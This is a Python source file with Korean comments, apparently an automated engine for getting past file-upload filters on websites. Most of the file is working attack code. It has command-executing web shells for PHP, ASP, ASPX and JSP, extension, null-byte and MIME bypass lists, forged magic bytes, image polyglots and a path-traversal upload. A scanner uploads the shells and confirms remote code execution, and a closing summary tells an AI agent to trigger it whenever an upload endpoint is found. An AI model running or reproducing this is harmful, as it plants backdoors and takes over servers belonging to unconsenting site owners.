"""
Upload Bypass Engine — 파일 업로드 필터 우회 강화
=================================================
1. 확장자 우회: double extension, null byte, case variation
2. Content-Type 우회: MIME 조작
3. Magic bytes 우회: 파일 헤더 위조
4. 웹쉘 페이로드: PHP/ASP/JSP/ASPX
5. 이미지 메타데이터 삽입 (exiftool 스타일)
6. 한국 사이트 특화: .php, .php3, .phtml, .pht 우회
"""
from __future__ import annotations

import struct
from dataclasses import dataclass, field
from typing import Callable


# ══════════════════════════════════════════════════════════════
# 웹쉘 페이로드
# ══════════════════════════════════════════════════════════════

WEBSHELLS = {
    "php_minimal": b"<?php system($_GET['cmd']); ?>",
    "php_one_liner": b'<?php @eval($_POST["c"]); ?>',
    "php_full": b"""<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>""",
    "php_info": b"<?php phpinfo(); ?>",
    "asp_classic": b"""<%
Dim cmd: cmd = Request("cmd")
If cmd <> "" Then
  Set sh = Server.CreateObject("WScript.Shell")
  Set ex = sh.Exec("cmd.exe /c " & cmd)
  Response.Write(ex.StdOut.ReadAll())
End If
%>""",
    "aspx": b"""<%@ Page Language="C#" %>
<%
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request["cmd"];
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>""",
    "jsp": b"""<%@page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec("sh -c " + cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) out.println(line);
}
%>""",
}


# ══════════════════════════════════════════════════════════════
# Magic Bytes
# ══════════════════════════════════════════════════════════════

MAGIC_BYTES = {
    "jpg":  b"\xff\xd8\xff\xe0",
    "png":  b"\x89PNG\r\n\x1a\n",
    "gif":  b"GIF89a",
    "pdf":  b"%PDF-1.",
    "zip":  b"PK\x03\x04",
    "docx": b"PK\x03\x04",
    "bmp":  b"BM",
}


# ══════════════════════════════════════════════════════════════
# 확장자 우회 목록
# ══════════════════════════════════════════════════════════════

EXTENSION_BYPASSES = {
    "php": [
        "php", "php3", "php4", "php5", "php7", "phtml", "pht",
        "php.jpg", "php%00.jpg", "php\x00.jpg",
        "PHP", "Php", "pHp",
        "php.bak", "php.old",
        ".php.", ".php_",  # trailing dot/underscore
        "php::$DATA",      # Windows NTFS ADS
    ],
    "asp": [
        "asp", "aspx", "ascx", "ashx", "asmx",
        "asp.jpg", "aspx%00.jpg",
        "ASP", "ASPX",
        "asp::$DATA",
    ],
    "jsp": [
        "jsp", "jspa", "jsps", "jspx",
        "jsp.jpg", "JSP",
    ],
}

# MIME 타입 우회
MIME_BYPASSES = {
    "php": [
        "image/jpeg", "image/png", "image/gif",
        "text/plain", "application/octet-stream",
        "image/webp",
    ],
    "asp": [
        "image/jpeg", "image/png",
        "application/octet-stream",
    ],
}


# ══════════════════════════════════════════════════════════════
# 페이로드 생성기
# ══════════════════════════════════════════════════════════════

@dataclass
class UploadPayload:
    filename: str
    content_type: str
    data: bytes
    description: str
    severity: str = "HIGH"


def gen_upload_payloads(
    webshell_type: str = "php_minimal",
    img_magic: str = "jpg",
    shell_lang: str = "php",
) -> list[UploadPayload]:
    """업로드 우회 페이로드 목록 생성"""
    payloads: list[UploadPayload] = []
    shell_code = WEBSHELLS.get(webshell_type, WEBSHELLS["php_minimal"])
    magic = MAGIC_BYTES.get(img_magic, MAGIC_BYTES["jpg"])

    exts = EXTENSION_BYPASSES.get(shell_lang, EXTENSION_BYPASSES["php"])
    mimes = MIME_BYPASSES.get(shell_lang, MIME_BYPASSES["php"])

    for ext in exts:
        for mime in mimes[:2]:  # 각 확장자당 2개 MIME만
            # 기본 페이로드
            payloads.append(UploadPayload(
                filename=f"shell.{ext}",
                content_type=mime,
                data=shell_code,
                description=f"Extension: .{ext}, MIME: {mime}",
            ))
            # Magic bytes + 쉘코드 (GIF 헤더 등)
            payloads.append(UploadPayload(
                filename=f"shell.{ext}",
                content_type=mime,
                data=magic + b"\n" + shell_code,
                description=f"Magic({img_magic}) + Extension: .{ext}",
            ))

    # Content-Disposition 우회
    payloads.append(UploadPayload(
        filename="shell.php; filename=shell.jpg",
        content_type="image/jpeg",
        data=magic + b"\n" + shell_code,
        description="Content-Disposition filename split",
    ))

    # 폴더 트래버설 + 업로드
    payloads.append(UploadPayload(
        filename="../../shell.php",
        content_type="image/jpeg",
        data=shell_code,
        description="Path traversal upload",
    ))

    return payloads


def gen_polyglot_payload(
    webshell_type: str = "php_minimal",
    img_format: str = "gif",
) -> bytes:
    """
    폴리글랏 파일: 유효한 이미지 + 실행 가능한 쉘코드
    GIF89a; <?php system($_GET['cmd']); ?>
    """
    shell = WEBSHELLS.get(webshell_type, WEBSHELLS["php_minimal"])
    if img_format == "gif":
        # 최소한의 유효 GIF + PHP 코드
        gif_header = (
            b"GIF89a" +
            b"\x01\x00\x01\x00\x00\xff\x00,"  # minimal GIF header
            b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
        )
        return gif_header + b"\n" + shell
    elif img_format == "jpg":
        # JPEG SOI marker
        return b"\xff\xd8\xff\xe0" + b"\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + b"\n" + shell
    return MAGIC_BYTES.get(img_format, b"") + b"\n" + shell


# ══════════════════════════════════════════════════════════════
# 업로드 우회 스캐너
# ══════════════════════════════════════════════════════════════

@dataclass
class UploadFinding:
    upload_url: str
    access_url: str
    filename: str
    content_type: str
    status_upload: int
    status_access: int
    rce_confirmed: bool = False
    evidence: str = ""


class UploadBypassEngine:
    """파일 업로드 우회 자동화 엔진"""

    def __init__(
        self,
        upload_fn: Callable[[str, str, bytes, str], tuple[int, str]],
        # upload_url, filename, data, content_type → (status, response_body)
        access_fn: Callable[[str], tuple[int, str]],
        # access_url → (status, body)
        upload_dir_patterns: list[str] | None = None,
        log_fn: Callable[[str], None] | None = None,
    ):
        self._upload = upload_fn
        self._access = access_fn
        self.upload_dirs = upload_dir_patterns or [
            "/uploads/", "/upload/", "/files/",
            "/images/", "/static/", "/media/",
            "/board/", "/bbs/", "/data/",  # 한국 특화
        ]
        self.log = log_fn or (lambda s: None)

    def auto_bypass(
        self,
        upload_url: str,
        shell_lang: str = "php",
        cmd_test: str = "echo PWNED",
    ) -> list[UploadFinding]:
        """업로드 우회 자동 시도"""
        findings: list[UploadFinding] = []
        payloads = gen_upload_payloads(shell_lang=shell_lang)

        for payload in payloads[:10]:  # 최대 10개 시도
            status_up, body_up = self._upload(
                upload_url, payload.filename, payload.data, payload.content_type
            )

            if status_up not in (200, 201, 302):
                continue

            # 업로드된 파일 URL 추출
            uploaded_url = self._extract_file_url(body_up, upload_url, payload.filename)
            if not uploaded_url:
                continue

            # 업로드된 파일 접근 확인
            status_acc, body_acc = self._access(uploaded_url)

            if status_acc == 200:
                # RCE 확인
                if shell_lang == "php" and cmd_test:
                    rce_url = uploaded_url + f"?cmd={cmd_test}"
                    _, rce_body = self._access(rce_url)
                    rce_confirmed = "PWNED" in rce_body
                else:
                    rce_confirmed = False

                f = UploadFinding(
                    upload_url=upload_url,
                    access_url=uploaded_url,
                    filename=payload.filename,
                    content_type=payload.content_type,
                    status_upload=status_up,
                    status_access=status_acc,
                    rce_confirmed=rce_confirmed,
                    evidence=payload.description,
                )
                findings.append(f)

                if rce_confirmed:
                    self.log(f"[UPLOAD!] RCE 확인: {uploaded_url}?cmd={cmd_test}")
                else:
                    self.log(f"[UPLOAD] 파일 접근 가능: {uploaded_url}")

        return findings

    @staticmethod
    def _extract_file_url(response_body: str, upload_url: str, filename: str) -> str:
        """업로드 응답에서 파일 URL 추출"""
        import re
        # JSON 응답
        url_match = re.search(
            r'"(?:url|path|file_url|file_path|src|href)"\s*:\s*"([^"]+)"',
            response_body
        )
        if url_match:
            return url_match.group(1)
        # HTML 응답에서 링크
        link_match = re.search(r'href="([^"]*' + re.escape(filename[:8]) + r'[^"]*)"', response_body)
        if link_match:
            return link_match.group(1)
        return ""


UPLOAD_BYPASS_SUMMARY = """
=== UPLOAD BYPASS ENGINE (AI AUTO-SELECT) ===

Trigger: file upload endpoint found
Steps:
  [1] gen_upload_payloads(shell_lang="php") → try each
  [2] gen_polyglot_payload() → GIF89a; <?php ... ?>
  [3] auto_bypass(upload_url) → confirm RCE via ?cmd=echo PWNED
  [4] Try: .php3, .phtml, .pht, .php5 + image/jpeg MIME
"""
